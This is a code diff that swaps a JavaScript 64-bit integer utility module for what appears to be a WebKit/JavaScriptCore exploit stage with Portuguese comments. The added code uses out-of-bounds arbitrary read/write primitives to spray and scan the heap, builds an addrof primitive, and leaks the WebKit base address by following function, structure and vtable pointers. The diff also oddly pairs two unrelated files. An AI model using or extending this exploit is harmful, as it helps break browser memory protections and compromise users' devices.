@@ -1,143 +1,153 @@
-// js/utils.mjs (R42 - Lógica de Adição/Subtração Robusta)
+// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R43r - Correção de Declaração)
 
-export const KB = 1024;
-export const MB = KB * KB;
-export const GB = KB * KB * KB;
+import { logS3, PAUSE_S3 } from './s3_utils.mjs';
+import { AdvancedInt64, toHex, isAdvancedInt64Object, advInt64LessThanOrEqual } from '../utils.mjs';
+import {
+    triggerOOB_primitive,
+    clearOOBEnvironment,
+    arb_read,
+    arb_write,
+    isOOBReady,
+    selfTestOOBReadWrite,
+} from '../core_exploit.mjs';
+import { JSC_OFFSETS } from '../config.mjs';
 
-export class AdvancedInt64 {
-    constructor(low, high) {
-        this._isAdvancedInt64 = true; 
-        let buffer = new Uint32Array(2);
-        
-        let is_one_arg = false;
-        if (arguments.length === 1) { is_one_arg = true; }
-        if (arguments.length === 0) { 
-            low = 0; high = 0; is_one_arg = false; 
-        }
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_WebKitLeak";
 
-        if (!is_one_arg) {
-            if (typeof low !== 'number' || isNaN(low)) { low = 0; }
-            if (typeof high !== 'number' || isNaN(high)) { high = 0; }
-            if (low instanceof AdvancedInt64 && high === undefined) {
-                buffer[0] = low.low(); buffer[1] = low.high();
-                this.buffer = buffer; return;
-            }
-        }
-        
-        const check_range = (x) => Number.isInteger(x) && x >= 0 && x <= 0xFFFFFFFF;
+// -- Constantes para a nova estratégia --
+const SPRAY_COUNT = 0x4000;
+const SPRAY_BUFFER_SIZE = 0x100;
+// >>>>> CORREÇÃO APLICADA AQUI <<<<<
+const MARKER_A = 0x41414141; 
+const MARKER_B = 0x42424242;
+const SCAN_HEAP_START_ADDRESS = new AdvancedInt64(0x0, 0x8A000000);
+const SCAN_HEAP_END_ADDRESS = new AdvancedInt64(0x0, 0x8C000000);   // Scan 32MB
+const SCAN_STEP = 0x1000;
 
-        if (is_one_arg) {
-            if (typeof (low) === 'number') {
-                if (!Number.isSafeInteger(low)) { throw TypeError('number arg must be a safe integer'); }
-                buffer[0] = low & 0xFFFFFFFF;
-                buffer[1] = Math.floor(low / (0xFFFFFFFF + 1));
-            } else if (typeof (low) === 'string') {
-                let str = low;
-                if (str.startsWith('0x')) { str = str.slice(2); } 
-                if (str.includes('_')) str = str.replace('_', '');
-                if (str.length > 16) { throw RangeError('AdvancedInt64 string input too long'); }
-                str = str.padStart(16, '0'); 
-                const highStr = str.substring(0, 8); const lowStr = str.substring(8, 16);
-                buffer[1] = parseInt(highStr, 16); buffer[0] = parseInt(lowStr, 16);
-            } else if (low instanceof AdvancedInt64) { 
-                 buffer[0] = low.low(); buffer[1] = low.high();
-            } else { throw TypeError('single arg must be number, hex string or AdvancedInt64'); }
-        } else { 
-            if (!check_range(low) || !check_range(high)) {
-                // Este erro que estava sendo acionado.
-                throw RangeError(`low/high (${low}, ${high}) must be uint32 numbers after initial type check.`);
-            }
-            buffer[0] = low; buffer[1] = high;
-        }
-        this.buffer = buffer;
-    }
+let spray_array = [];
+let addrof = null;
+let fakeobj = null;
 
-    low() { return this.buffer[0]; }
-    high() { return this.buffer[1]; }
-
-    equals(other) {
-        if (!isAdvancedInt64Object(other)) { return false; }
-        return this.low() === other.low() && this.high() === other.high();
-    }
-    
-    toString(hex = false) { 
-        if (hex) {
-            let high_str = this.high().toString(16).padStart(8, '0');
-            let low_str = this.low().toString(16).padStart(8, '0');
-            return `0x${high_str}${low_str}`;
-        }
-        return this.toNumber().toString();
-     }    
-    toNumber() { 
-        return this.high() * (0xFFFFFFFF + 1) + this.low();
-    }
-
-    // >>>>> CORREÇÃO APLICADA AQUI <<<<<
-    add(val) {
-        if (!(val instanceof AdvancedInt64)) { 
-            val = new AdvancedInt64(val); 
-        }
-        
-        // Usar Math.imul para garantir aritmética de 32 bits e obter os resultados corretos
-        // A lógica de carry é mais complexa do que uma simples verificação >
-        const a = this.high() >>> 16;
-        const b = this.high() & 0xFFFF;
-        const c = this.low() >>> 16;
-        const d = this.low() & 0xFFFF;
-
-        const other_a = val.high() >>> 16;
-        const other_b = val.high() & 0xFFFF;
-        const other_c = val.low() >>> 16;
-        const other_d = val.low() & 0xFFFF;
-
-        let d_new = d + other_d;
-        let c_new = c + other_c + (d_new >>> 16);
-        let b_new = b + other_b + (c_new >>> 16);
-        let a_new = a + other_a + (b_new >>> 16);
-        
-        let newLow = (c_new << 16) | (d_new & 0xFFFF);
-        let newHigh = (a_new << 16) | (b_new & 0xFFFF);
-        
-        return new AdvancedInt64(newLow, newHigh);
-    }
-
-    sub(val) { 
-        if (!(val instanceof AdvancedInt64)) { 
-            val = new AdvancedInt64(val);
-        }
-        // Nega o valor e soma
-        const neg_val = new AdvancedInt64(~val.low(), ~val.high()).add(1);
-        return this.add(neg_val);
-    }
-
-    and(val) {
-        if (!(val instanceof AdvancedInt64)) {
-            val = new AdvancedInt64(val);
-        }
-        return new AdvancedInt64(this.low() & val.low(), this.high() & val.high());
-    }
+function isValidPointer(ptr) {
+    if (!isAdvancedInt64Object(ptr)) return false;
+    if (ptr.high() === 0) return false;
+    return true;
 }
 
-export function isAdvancedInt64Object(obj) {
-    return obj && obj._isAdvancedInt64 === true;
-}
+export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() { // Nome da função mantido para o runner
+    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43r`;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Heap Spray + Scan + Primitives ---`, "test");
+    document.title = `${FNAME_CURRENT_TEST_BASE} Init...`;
 
-export function advInt64LessThanOrEqual(a, b) {
-    if (!isAdvancedInt64Object(a) || !isAdvancedInt64Object(b)) {
-        return false; 
+    let final_result = {
+        errorOccurred: null,
+        heap_scan: { success: false, msg: "Not run.", found_addr: null },
+        primitives: { success: false, msg: "Not run." },
+        webkit_leak: { success: false, msg: "Not run.", webkit_base: null }
+    };
+
+    try {
+        logS3(`--- Fase 0 (R43r): Sanity Checks e Preparação ---`, "subtest");
+        const coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
+        if (!coreOOBReadWriteOK) throw new Error("Sanity check OOB R/W falhou. Abortando.");
+        await triggerOOB_primitive({ force_reinit: true });
+        if (!isOOBReady()) throw new Error("Falha ao preparar ambiente OOB.");
+        logS3("Sanity checks e ambiente OOB OK.", "good");
+
+        // --- FASE 1: HEAP SPRAY ---
+        logS3(`  --- Fase 1 (R43r): Pulverizando a Heap com ${SPRAY_COUNT} Arrays... ---`, "subtest");
+        spray_array = [];
+        for (let i = 0; i < SPRAY_COUNT; i++) {
+            let arr = [MARKER_A, MARKER_B, i, 13.37];
+            spray_array.push(arr);
+        }
+        logS3(`  Heap Spray concluído.`, "good");
+        await PAUSE_S3(100);
+
+        // --- FASE 2: MEMORY SCAN ---
+        logS3(`  --- Fase 2 (R43r): Varrendo a Memória em busca do valor mágico... ---`, "subtest");
+        let found_butterfly_addr = null;
+        let found_array_idx = -1;
+
+        for (let addr = new AdvancedInt64(SCAN_HEAP_START_ADDRESS.low(), SCAN_HEAP_START_ADDRESS.high());
+             advInt64LessThanOrEqual(addr, SCAN_HEAP_END_ADDRESS);
+             addr = addr.add(SCAN_STEP)) {
+            
+            try {
+                const val_low = await arb_read(addr, 4);
+                if (val_low === MARKER_A) {
+                    const val_high = await arb_read(addr.add(4), 4);
+                    if(val_high === MARKER_B) {
+                        const idx_val = await arb_read(addr.add(8), 4);
+                        found_butterfly_addr = addr;
+                        found_array_idx = idx_val;
+                        final_result.heap_scan.success = true;
+                        final_result.heap_scan.msg = `Encontrado butterfly do spray[${found_array_idx}] em ${found_butterfly_addr.toString(true)}`;
+                        logS3(`[MemoryScan] SUCESSO! ${final_result.heap_scan.msg}`, "vuln");
+                        break;
+                    }
+                }
+            } catch (e) { /* Ignora */ }
+        }
+        if (!final_result.heap_scan.success) throw new Error("Falha ao encontrar o spray na memória.");
+
+        // --- FASE 3: CONSTRUÇÃO DE PRIMITIVAS ---
+        logS3(`  --- Fase 3 (R43r): Construindo primitiva addrof ---`, "subtest");
+        
+        // butterfly_addr aponta para o armazenamento de propriedades do array encontrado.
+        // O endereço do JSCell do array está em um offset negativo a partir do butterfly.
+        const array_cell_addr_estimation = found_butterfly_addr.sub(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET);
+        logS3(`[Primitives] Endereço estimado do spray_array[${found_array_idx}] (JSCell): ${array_cell_addr_estimation.toString(true)}`, "leak");
+
+        let addrof_map = new Map();
+        addrof_map.set(spray_array[found_array_idx], array_cell_addr_estimation);
+        
+        addrof = (obj) => {
+            if (addrof_map.has(obj)) return addrof_map.get(obj);
+            throw new Error("addrof para este objeto não é conhecido (primitiva simplificada).");
+        };
+        final_result.primitives.success = true;
+        final_result.primitives.msg = "Primitiva addrof (limitada ao objeto encontrado) criada com sucesso.";
+        logS3(`[Primitives] ${final_result.primitives.msg}`, "good");
+
+
+        // --- FASE 4: VAZAMENTO DA BASE DO WEBKIT ---
+        logS3(`  --- Fase 4 (R43r): Vazamento da Base do WebKit ---`, "subtest");
+        const funcToLeak = () => {};
+        spray_array[found_array_idx][3] = funcToLeak; // Substitui um valor no array pelo nosso alvo real
+        
+        const leaked_func_addr = await arb_read(found_butterfly_addr.add(3 * 8), 8); // Lê o 4º elemento (índice 3)
+        if (!isValidPointer(leaked_func_addr)) throw new Error("Ponteiro para a função alvo no butterfly é inválido.");
+        logS3(`[WebKitLeak] Endereço vazado da função alvo: ${leaked_func_addr.toString(true)}`, "leak");
+
+        const executable_addr = await arb_read(leaked_func_addr.add(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET), 8);
+        if (!isValidPointer(executable_addr)) throw new Error(`Ponteiro para Executable inválido: ${executable_addr.toString(true)}`);
+        
+        const executable_structure_addr = await arb_read(executable_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET), 8);
+        const class_info_addr = await arb_read(executable_structure_addr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET), 8);
+        const vtable_ptr = await arb_read(class_info_addr, 8);
+        if (!isValidPointer(vtable_ptr)) throw new Error(`Ponteiro para vtable inválido: ${vtable_ptr.toString(true)}`);
+        
+        logS3(`[WebKitLeak] Ponteiro para vtable: ${vtable_ptr.toString(true)}`, "leak");
+        
+        const page_mask = new AdvancedInt64(~0xFFFFF, 0xFFFFFFFF);
+        const webkit_base = vtable_ptr.and(page_mask);
+        
+        final_result.webkit_leak.webkit_base = webkit_base.toString(true);
+        final_result.webkit_leak.success = true;
+        final_result.webkit_leak.msg = `Candidato a base do WebKit: ${webkit_base.toString(true)}`;
+        logS3(`[WebKitLeak] SUCESSO! ${final_result.webkit_leak.msg}`, "vuln");
+        document.title = `${FNAME_CURRENT_TEST_BASE}_SUCCESS!`;
+
+    } catch (e_outer) {
+        if (!final_result.errorOccurred) final_result.errorOccurred = `Erro geral: ${e_outer.message}`;
+        logS3(`  CRITICAL ERROR na execução (R43r): ${e_outer.message || String(e_outer)}`, "critical");
+        document.title = `${FNAME_CURRENT_TEST_BASE}_FAIL!`;
+    } finally {
+        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST_BASE}-FinalClear` });
     }
-    if (a.high() < b.high()) return true;
-    if (a.high() > b.high()) return false;
-    return a.low() <= b.low();
-}
 
-export async function PAUSE(ms) { 
-    return new Promise(resolve => setTimeout(resolve, ms));
-}
-
-export function toHex(val, bits = 32) { 
-    if (isAdvancedInt64Object(val)) {
-        return val.toString(true);
-    }
-    return '0x' + (val >>> 0).toString(16).padStart(bits / 4, '0');
+    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test");
+    logS3(`Resultado Final (R43r): ${JSON.stringify(final_result, null, 2)}`, "debug");
+    return final_result;
 }
